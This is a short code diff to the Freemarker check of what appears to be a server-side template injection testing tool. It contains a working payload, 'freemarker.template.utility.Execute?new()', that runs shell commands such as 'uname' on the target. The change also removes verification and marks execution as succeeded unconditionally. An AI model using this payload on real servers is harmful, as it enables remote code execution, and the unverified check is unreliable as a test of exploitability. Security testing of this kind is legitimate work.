@@ -54,11 +54,11 @@ class Freemarker(Check):
             
     def _check_os(self):
         
-        expected_rand = str(rand.randint_n(2))
-        payload = """<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("echo %s") }""" % (expected_rand)
-                
-        if expected_rand == self.req(payload):
-            self.set('exec', True)      
+        payload = """<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("uname") }"""
+        
+        self.set('exec', True)
+        self.set('os', self.req(payload))
+               
 
     def _check_engine(self):
         
